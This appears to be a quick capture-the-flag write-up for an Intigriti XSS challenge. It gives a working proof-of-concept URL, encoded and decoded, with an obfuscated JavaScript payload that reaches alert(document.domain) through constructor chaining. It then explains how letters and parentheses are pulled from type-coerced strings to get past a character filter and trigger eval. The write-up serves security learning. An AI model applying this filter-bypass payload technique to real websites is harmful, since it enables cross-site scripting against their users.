@@ -1,0 +1,25 @@
+Very quick and dirty write up :
+
+PoC url:
+https://challenge-0521.intigriti.io/captcha.php?&c=1&b=-%5B0%5D%5B%60%60%2B%5B%5D%2B%60%24%7Be%7D%60%5B5%5D%2B%60%24%7Be%7D%60%5B1%5D%2B%60%24%7Be%7D%60%5B25%5D%2B%60%24%7Be%7D%60%5B18%5D%2B%60%24%7Be%7D%60%5B6%5D%2B%60%24%7Be%7D%60%5B13%5D%2B%60%24%7Be.ee%7D%60%5B0%5D%2B%60%24%7Be%7D%60%5B5%5D%2B%60%24%7Be%7D%60%5B6%5D%2B%60%24%7Be%7D%60%5B1%5D%2B%60%24%7Be%7D%60%5B13%5D%5D%5B%60%60%2B%5B%5D%2B%60%24%7Be%7D%60%5B5%5D%2B%60%24%7Be%7D%60%5B1%5D%2B%60%24%7Be%7D%60%5B25%5D%2B%60%24%7Be%7D%60%5B18%5D%2B%60%24%7Be%7D%60%5B6%5D%2B%60%24%7Be%7D%60%5B13%5D%2B%60%24%7Be.ee%7D%60%5B0%5D%2B%60%24%7Be%7D%60%5B5%5D%2B%60%24%7Be%7D%60%5B6%5D%2B%60%24%7Be%7D%60%5B1%5D%2B%60%24%7Be%7D%60%5B13%5D%5D%60e%24%7B%60%24%7B%60%24%7B1-%7Be%7D%7D%60%5B1%5D%2B%60%24%7Be%7D%60%5B21%5D%2B%60%24%7Be%7D%60%5B17%5D%2B%60%24%7Be%7D%60%5B16%5D%2B%60%24%7Be%7D%60%5B26%5D%2B%60%24%7B%5B1%2B%5B%5D%5B%5B%5D%2B%60%24%7Be%7D%60%5B5%5D%2B%60%24%7Be%7D%60%5B1%5D%2B%60%24%7Be%7D%60%5B25%5D%2B%60%24%7Be%7D%60%5B18%5D%2B%60%24%7
+
+Not encoded:
+https://challenge-0521.intigriti.io/captcha.php?&c=1&b=-[0][``+[]+`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e.ee}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]][``+[]+`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e.ee}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`e${`${`${1-{e}}`[1]+`${e}`[21]+`${e}`[17]+`${e}`[16]+`${e}`[26]+`${[1+[][[]+`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e.ee}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]][0][15]     +`${[1+[][[]+`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e.ee}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]][0][15]+`${e.ee}`[2]+`${e}`[1]+`${e}`[5]+`${e.ee}`[0]+`${e}`[23]+`${e}`[4]+`${e}`[25]+`${e}`[6]+`${/./}`[1]+`${e.ee}`[2]+`${e}`[1]+`${e}`[23]+`${1-{e}}`[1]+`${e.ee}`[5]+`${e.ee}`[1]+[1+[][[]+`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e.ee}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]][0][16]}`+[1+[][[]+`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e.ee}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]][0][16]}`}+1`}e` ``-
+
+
+This ugly payload is built from [0]['constructor']['contructor']alert(document.domain).
+
+Because of the regexp, we can't use letters except "e" and no "(" or ")".
+So, I used and abused of type conversion to get the letter I needed to use:
+${e.ee} ==> "undefined"   ==>    to get "u" "n" "d" "e" "f" "i" letters
+${e}=> "[object HTMLProgressElement]" ==> to get "o" "b" "j" "t" "r" "g" ... letters
+${1-{e}} = > "NaN"  ==> to get the "a"
+
+[1+[][[]+`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e.ee}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]] ==> "1function Array() { [native code] }"     ==> I can get the parenthesis from this string
+
+with these strings (and string[x] to get the right x index), I can build the alert(document.domain) JS code, using the alphabet I get from the above lines.
+
+The use of eval in the calc function fires the payload, if the user click on "Send" !
+
+Do not forget to url encode the + sign (or it will be interpreted as a space) and as the code is "eval (a + b + c)", I added a minus sign to force a string concatenation.
+
